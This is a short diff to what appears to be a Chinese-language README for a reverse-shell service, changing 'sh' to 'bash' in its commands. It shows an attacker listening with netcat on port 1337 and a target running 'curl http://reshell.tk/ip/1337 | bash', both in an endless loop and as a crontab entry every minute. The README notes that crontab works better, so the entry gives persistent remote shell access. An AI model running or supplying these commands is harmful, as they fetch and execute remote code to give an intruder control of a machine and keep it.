@@ -19,14 +19,14 @@ nc -l 1337
 
 ## Target Machine
 ```
-curl http://reshell.tk/ip/1337 | sh
+curl http://reshell.tk/ip/1337 | bash
 或者
-while true; do curl http://reshell.tk/ip/1337 | sh; done
+while true; do curl http://reshell.tk/ip/1337 | bash; done
 ```
 配合crontab使用效果更佳
 ```
 crontab -e
-* * * * * /usr/bin/curl http://reshell.tk/ip/1337 | sh
+* * * * * /usr/bin/curl http://reshell.tk/ip/1337 | bash
 ```
 
 # 致谢
